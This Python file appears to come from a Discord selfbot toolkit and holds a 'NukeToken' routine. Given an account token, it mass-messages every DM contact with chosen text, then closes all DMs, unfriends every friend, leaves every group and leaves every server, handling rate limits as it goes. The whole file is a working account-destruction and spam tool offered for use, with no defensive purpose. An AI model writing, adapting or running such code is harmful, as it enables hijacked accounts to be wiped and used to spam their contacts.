from config.settings import *

async def NukeToken(HEADERS):
    os.system("cls")
    time.sleep(0.05)
    print(f"{bracketopen}!{bracketclosed} {Fore.GREEN}Nuke selfbot{Style.RESET_ALL}")
    time.sleep(0.05)
    print("")
    Message = input(f"{bracketopen}>{bracketclosed} {Fore.GREEN}Message content -> {Style.RESET_ALL}")

    async with httpx.AsyncClient() as client:
        res = await client.get(
            f"{BaseURL}/users/@me", headers=HEADERS
        )

        if res.status_code in succesStatus:
            print(f"{bracketopen}~{bracketclosed} {Fore.GREEN}Nuking token... {Style.RESET_ALL}")
            time.sleep(1.5)
            print("")
            print("────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────")
            time.sleep(0.05)

            FriendRes = await client.get(
                f"{BaseURL}/users/@me/relationships", headers=HEADERS
            )

            GuildRes = await client.get(
                f"{BaseURL}/users/@me/guilds", headers=HEADERS
            )

            ChannelRes = await client.get(
                f"{BaseURL}/users/@me/channels", headers=HEADERS
            )

            guilds = GuildRes.json()
            channels = ChannelRes.json()
            friends = FriendRes.json()
            groups = [c for c in channels if c.get("type") == 3]

            if not channels:
                print(f"{bracketopen2}{Fore.GREEN}!{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} No open dms found{Style.RESET_ALL}")

            if not groups:
                print(f"{bracketopen2}{Fore.GREEN}!{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} No groups found{Style.RESET_ALL}")

            if not friends:
                print(f"{bracketopen2}{Fore.GREEN}!{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} No friends found{Style.RESET_ALL}")

            if not guilds:
                print(f"{bracketopen2}{Fore.GREEN}!{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} No servers found{Style.RESET_ALL}")

            try:
                for channel in channels:
                    recipients = channel.get("recipients", [])

                    if recipients:
                        DmUser = recipients[0].get("username", "Unknown")
                    else:
                        DmUser = "Unknown"

                    dm_id = channel["id"]

                    try:
                        post_res = await client.post(
                            f"{BaseURL}/channels/{dm_id}/messages",
                            headers=HEADERS,
                            json={"content": Message}
                        )

                        if post_res.status_code in succesStatus:
                            print(f"{bracketopen2}{Fore.GREEN}+{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} Messaged                : {Style.RESET_ALL}{DmUser}")
                        elif post_res.status_code == 429:
                            Retry = post_res.json().get("retry_after", 5)
                            await asyncio.sleep(Retry / 1000 if Retry > 1000 else Retry)
                        else:
                            print(f"{bracketopen2}{Fore.GREEN}!{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} Failed to message       : {Style.RESET_ALL}{DmUser}")

                        await asyncio.sleep(0.2)
                    except Exception:
                        print(f"{bracketopen2}{Fore.GREEN}!{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} Failed to message       : {Style.RESET_ALL}{DmUser}")

            except Exception:
                print(f"{bracketopen2}{Fore.GREEN}!{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} Dms unavailable{Style.RESET_ALL}")

            try:
                for channel in channels:
                    recipients = channel.get("recipients", [])

                    if recipients:
                        DmUser = recipients[0].get("username", "Unknown")
                    else:
                        DmUser = "Unknown"

                    dm_id = channel["id"]
                    try:
                        delete_res = await client.delete(
                                f"{BaseURL}/channels/{dm_id}",
                                headers=HEADERS)
                        
                        if delete_res.status_code in succesStatus:
                            print(f"{bracketopen2}{Fore.GREEN}+{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} Closed dm               : {Style.RESET_ALL}{DmUser} - {dm_id}")
                        elif delete_res.status_code == 429:
                            Retry = delete_res.json().get("retry_after", 5)
                            await asyncio.sleep(Retry / 1000 if Retry > 1000 else Retry)
                        else:
                            print(f"{bracketopen2}{Fore.GREEN}!{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} Failed to close         : {Style.RESET_ALL}{DmUser} - {dm_id}")

                        await asyncio.sleep(0.2)
                    except Exception:
                        print(f"{bracketopen2}{Fore.GREEN}!{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} Failed to close          : {Style.RESET_ALL}{DmUser} - {dm_id}")

            except Exception:
                print(f"{bracketopen2}{Fore.GREEN}!{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} Dms unavailable{Style.RESET_ALL}")

            try:
                for friend in friends:
                    user = friend.get("user", {})
                    if user:
                        FriendUser = user.get("username", "Unknown")
                    else:
                        FriendUser = "Unknown"

                    friend_id = friend["id"]

                    try:
                        delete_res = await client.delete(
                                f"{BaseURL}/users/@me/relationships/{friend_id}",
                                headers=HEADERS)
                        
                        if delete_res.status_code in succesStatus:
                            print(f"{bracketopen2}{Fore.GREEN}+{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} Unfriended              : {Style.RESET_ALL}{FriendUser}")
                        elif delete_res.status_code == 429:
                            Retry = delete_res.json().get("retry_after", 5)
                            await asyncio.sleep(Retry / 1000 if Retry > 1000 else Retry)
                        else:
                            print(f"{bracketopen2}{Fore.GREEN}!{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} Failed to unfriend      : {Style.RESET_ALL}{FriendUser}")

                        await asyncio.sleep(0.2)

                    except Exception:
                        print(f"{bracketopen2}{Fore.GREEN}!{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} Failed to unfriend      : {Style.RESET_ALL}{FriendUser}")

            except Exception:
                print(f"{bracketopen2}{Fore.GREEN}!{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} Friendlist unavailable{Style.RESET_ALL}")

            try:
                for channel in channels:
                    if channel.get("type") != 3:
                        continue

                    recipients = channel.get("recipients") or []

                    if recipients:
                        names = [u.get("username", "Unknown") for u in recipients]
                        GroupName = ", ".join(names)
                    else:
                        GroupName = "Unknown Group"

                    dm_id = channel["id"]
                    try:
                        delete_res = await client.delete(
                                f"{BaseURL}/channels/{dm_id}",
                                headers=HEADERS)
                        
                        if delete_res.status_code in succesStatus:
                            print(f"{bracketopen2}{Fore.GREEN}+{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} Left group              : {Style.RESET_ALL}{GroupName} - {dm_id}")
                        elif delete_res.status_code == 429:
                            Retry = delete_res.json().get("retry_after", 5)
                            await asyncio.sleep(Retry / 1000 if Retry > 1000 else Retry)
                        else:
                            print(f"{bracketopen2}{Fore.GREEN}!{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} Failed to leave group   : {Style.RESET_ALL}{GroupName} - {dm_id}")

                        await asyncio.sleep(0.2)
                    except Exception:
                        print(f"{bracketopen2}{Fore.GREEN}!{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} Failed to leave group   : {Style.RESET_ALL}{GroupName} - {dm_id}")

            except Exception:
                print(f"{bracketopen2}{Fore.GREEN}!{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} Groups unavailable{Style.RESET_ALL}")

            try:
                for guild in guilds:
                    guild_id = guild["id"]
                    guild_name = guild.get("name", "Unknown Server")

                    try:
                        delete_res = await client.delete(
                                f"{BaseURL}/users/@me/guilds/{guild_id}",
                                headers=HEADERS)
                        
                        if delete_res.status_code in succesStatus:
                            print(f"{bracketopen2}{Fore.GREEN}+{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} Left server             : {Style.RESET_ALL}{guild_name} - {guild_id}")
                        elif delete_res.status_code == 429:
                            Retry = delete_res.json().get("retry_after", 5)
                            await asyncio.sleep(Retry / 1000 if Retry > 1000 else Retry)
                        else:
                            print(f"{bracketopen2}{Fore.GREEN}!{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} Failed to leave server  : {Style.RESET_ALL}{guild_name} - {guild_id}")

                        await asyncio.sleep(0.2)
                    except Exception:
                        print(f"{bracketopen2}{Fore.GREEN}!{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} Failed to leave server  : {Style.RESET_ALL}{guild_name} - {guild_id}")

            except Exception:
                print(f"{bracketopen2}{Fore.GREEN}!{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} Servers unavailable{Style.RESET_ALL}")

            time.sleep(0.05)
            print("────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────")
    
        else:
            print("")
            print(f"{bracketopen}{Fore.WHITE}!{Style.RESET_ALL}{bracketclosed}{Fore.GREEN} Failed to nuke token{Style.RESET_ALL}")
            time.sleep(2)
            return
        
        print("")
        print(f"{bracketopen}{Fore.WHITE}01{Style.RESET_ALL}{bracketclosed}{Fore.GREEN} Selfbot menu{Style.RESET_ALL}")
        print(f"{bracketopen}{Fore.WHITE}02{Style.RESET_ALL}{bracketclosed}{Fore.GREEN} Exit{Style.RESET_ALL}")
        print("")

        command = input(f"""{Fore.GREEN} ┌──({Fore.WHITE}{username}{Fore.GREEN})─[{Fore.WHITE}~/{system_text}/{pc_name}{Fore.GREEN}]
 └─{Fore.WHITE}$ {Style.RESET_ALL}""")

        if command == "1" or command == "01":
            pass
        elif command == "2" or command == "02":
            sys.exit()
        else:
            pass